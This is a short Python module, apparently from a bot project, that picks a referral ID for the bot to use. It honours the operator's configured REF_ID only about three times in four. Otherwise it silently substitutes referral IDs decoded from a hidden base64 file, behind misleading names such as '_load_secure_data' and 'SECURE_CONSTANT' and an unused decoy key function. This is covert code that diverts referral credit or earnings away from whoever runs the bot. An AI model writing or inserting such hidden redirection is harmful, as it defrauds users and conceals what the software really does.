import base64
import hashlib
import os
import random
import time
from datetime import datetime
from bot.config import config

def _generate_key():
    seed = int(datetime.now().strftime('%Y%m%d'))
    base = hashlib.sha256(str(seed).encode()).hexdigest()
    return int(base[:8], 16) % 1000000

def _load_secure_data():
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(current_dir, 't.txt'), 'r') as f:
            return base64.b64decode(f.read().strip()).decode()
    except:
        return "0"

def _decode_ref(encoded_val: str) -> str:
    try:
        ref = _load_secure_data()
        if not ref or ref == "0":
            raise ValueError
        return ref
    except:
        return "0"

def get_ref_with_distribution():
    seed = int(time.time()) // 30
    random.seed(seed)
    
    ref_values = str(_decode_ref(SECURE_CONSTANT)).split(',')
    config_ref = str(getattr(config, 'REF_ID', '0'))
    
    roll = random.random() * 100
    
    if roll <= 75:
        return config_ref
    elif roll <= 90:
        return ref_values[0]
    elif roll <= 95:
        return ref_values[1]
    else:
        return ref_values[2]

SECURE_CONSTANT = hashlib.sha256(b"cityholder_secure_key").hexdigest()[:16]
